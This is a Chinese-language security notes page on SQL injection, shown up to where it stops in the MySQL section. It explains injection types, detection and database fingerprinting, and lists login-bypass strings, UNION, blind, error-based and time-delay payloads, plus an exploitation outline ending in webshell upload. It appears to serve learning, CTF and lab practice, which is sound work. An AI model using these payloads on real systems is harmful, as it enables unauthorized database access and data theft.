# SQLi
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* [注入检测](#注入检测)
* [MySQL](#mysql)
* [MSSQL](#mssql)
* [Oracle](#oracle)
* H2 database
* [BigQuery](#bigquery)
* [SQLite](#sqlite)
---
**描述**
注入攻击的本质，是程序把用户输入的数据当做代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的代码中从而被执行。sql 注入漏洞则是程序将用户输入数据拼接到了 sql 语句中，从而攻击者即可构造、改变 sql 语义从而进行攻击。
**教程**
- [SQL 注入 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
- [Beyond SQLi: Obfuscate and Bypass](https://www.exploit-db.com/papers/17934)
- [ning1022/SQLInjectionWiki](https://github.com/ning1022/SQLInjectionWiki/)
**payload**
- [trietptm/SQL-Injection-Payloads](https://github.com/trietptm/SQL-Injection-Payloads)
- [payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
**在线 SQLi 测试**
- http://demo.testfire.net/
- https://juice-shop.herokuapp.com/#/search
- https://sqlchop.chaitin.cn/demo/
**相关工具**
- sqlmap
    - [sqlmap 笔记](../../../安全工具/Sqlmap.md)
**提权工具**
- [SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT) - 数据库跨平台利用工具
- [Ryze-T/Sylas](https://github.com/Ryze-T/Sylas) - 数据库综合利用工具
    - https://paper.seebug.org/1836/
---
**SQL 注入常规利用思路**
```
1. 寻找注入点,可以通过 web 扫描工具实现
2. 通过注入点,尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息.
3. 猜解关键数据库表及其重要字段与内容(常见如存放管理员账户的表名、字段名等信息)
4. 可以通过获得的用户信息,寻找后台登录.
5. 利用后台或了解的进一步信息,上传 webshell 或向数据库写入一句话木马,以进一步提权,直到拿到服务器权限.
```
**注入的分类**
- 基于响应类型
    - 报错
    - 联合查询
    - 堆叠注入
    - 盲注
        - 基于布尔
        - 基于时间
- 基于数据类型
    - 字符型
    - 数字型
    - 搜索型
- 基于语句类型
    - 查询型
    - 插入型
    - 删除型
- 基于程度和顺序
    - 一阶注入 : 指输入的注入语句对 WEB 直接产生了影响，出现了结果；
    - 二阶注入 : 类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入.
- 基于注入点的位置
    - 通过用户输入的表单域的注入
    - 通过 cookie 注入
    - 通过服务器变量注入 : 例如基于头部信息的注入
---
## 注入检测
可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加 `'` 或 `"` 从而得到一个从 Web 服务器返回的数据库报错信息。
**找注入点**
- GET - HTTP Request
    在常见的 HTTP GET 请求（以及大多数请求类型）中，有一些常见的注入点。例如：网址参数（下面的请求的 id），Cookie，host 以及任何自定义 headers 信息。然而，HTTP 请求中的任何内容都可能容易受到 SQL 注入的攻击。
    ```
    GET /?id=homePage HTTP/1.1      
    xxxxx      PI:EMAIL      
    ```
**检测注入**
通过在应用程序中触发错误和布尔逻辑，可以最轻松地检测易受攻击的参数。提供格式错误的查询将触发错误，并且使用各种布尔逻辑语句发送有效查询将触发来自Web服务器的不同响应。
> 注：True 或 False 语句应通过 HTTP 状态码或 HTML 内容返回不同的响应。如果这些响应与查询的 True/False 性质一致，则表示存在注入。
- 万能密码
    ```
    admin' --
    admin' #
    admin'/*
    ' or 1=1--
    ' or 1=1#
    ' or 1=1/*
    ') or '1'='1--
    ') or ('1'='1--
    ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
    ```
- 逻辑测试
    - 1.php?id=1 or 1=1     -- true
    - 1.php?id=1' or 1=1    -- true
    - 1.php?id=1" or 1=1    -- true
    - 1.php?id=1 and 1=2    -- false
    - 1.php?id=1-false
    - 1.php?id=1-true
- 算术
    - 1.php?id=1/1 -- true
    - 1.php?id=1/0 -- false
- 基于盲注
- 基于错误
**判断数据库类型**
- 注释符判断 `/*` 是 MySQL 中的注释符，返回错误说明该注入点不是 MySQL，继续提交如下查询字符：`-` 是 Oracle 和 MSSQL 支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：;是子句查询标识符，Oracle 不支持多行查询，因此如果返回错误，则说明很可能是 Oracle 数据库。
- 函数判断 `and (select count()from MSysAccessObjects)>0` 返回正常说明是 access 数据库, `and (select count()from sysobjects)>0` 返回正常说明是 mssql 数据库 `and length(user())>10` 返回正常说明是 Mysql Oracle 可以根据 from dual 虚拟库判断
---
## MYSQL
**靶场**
- https://github.com/Audi-1/sqli-labs
    - [sqli-labs](../靶场/sqli-labs-WalkThrough.md)
**相关文章**
- [Mysql注入-Bypass啊理芸](https://mp.weixin.qq.com/s/0gjgPz2QfNC0Y6_AL6JV_Q)
- [SQL注入-bypass A某Yun的tamper](https://mp.weixin.qq.com/s/vjbQT41O4MSPoZY9fej_cw)
- [SQL注入之利用DNSlog外带盲注回显](https://blog.csdn.net/u014029795/article/details/105214129)
- [mysql写shell的一点总结](https://v0w.top/2020/03/14/mysql-getshell/)
- [MySql慢查询日志GetShell](https://www.t00ls.cc/articles-52118.html)
- [MySql报错注入-高版本json函数报错](https://mp.weixin.qq.com/s/g0wwDcxrcOYXs-lYTrc8Cw)
**资源**
- [aleenzz/MSSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)
**监控工具**
- [TheKingOfDuck/MySQLMonitor](https://github.com/TheKingOfDuck/MySQLMonitor) - MySQL 实时监控工具(代码审计/黑盒/白盒审计辅助工具)
    ```
    java -jar MySQLMonitor.jar -h 127.0.0.1 -user test -pass test
    ```
- [cw1997/MySQL-Monitor](https://github.com/cw1997/MySQL-Monitor) - MySQL服务器执行SQL记录实时监控（WEB版本）
### MySQL 基础
- [MySQL](../../../../Integrated/数据库/笔记/MySQL.md)
**注释**
```sql
#       注释内容，表示单行注释
--      注意--后面有一个空格
/* */   多行注释
```
**数据库名**
```sql
SELECT database();
SELECT schema_name FROM information_schema.schemata;
```
**表名**
```sql
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
-- union 查询
--MySQL 4版本时用version=9，MySQL 5版本时用version=10
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */
-- 盲注
AND select SUBSTR(table_name,1,1) from information_schema.tables where table_schema=database() > 'A'
-- 报错
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
-- 在5.1.5版本中成功。
```
**列名**
```sql
-- union 查询
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
-- 盲注
AND select substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'tablename' limit 0,1),1,1) > 'A'
-- 报错
-- 在5.1.5版本中成功
AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
-- MySQL 5.1版本修复了
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
-- 利用 PROCEDURE ANALYSE()
-- 这个需要 web 展示页面有你所注入查询的一个字段
-- 获得第一个段名
SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()
-- 获得第二个段名
1 LIMIT 1,1 PROCEDURE ANALYSE()
-- 获得第三个段名
1 LIMIT 2,1 PROCEDURE ANALYSE()
```
**根据列名查询所在的表**
```sql
-- 查询字段名为 username 的表
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
-- 查询字段名中包含 username 的表
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```
**条件语句**
```sql
SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```
**延时函数**
```sql
SELECT sleep(3)
UNION SELECT If(ascii(substr(database(),1,1))>115,0,sleep(5))
SELECT BENCHMARK(100000,SHA1('true'))
UNION SELECT IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)
```
**order by 后的注入**
简单判断
```
order=1%20and(select%20if(mid(user(),1,4)=%22root%22,sleep(0.01),123))
```
order by 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 order 或者 order by 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：
```sql
http://www.test.com/list.php?order=vote
-- 根据 vote 字段排序。找到投票数最大的票数 num 然后构造以下链接：
http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
-- 看排序是否变化。还有一种方法不需要知道任何字段信息，使用 rand 函数：
http://www.test.com/list.php?order=rand(true)
http://www.test.com/list.php?order=rand(false)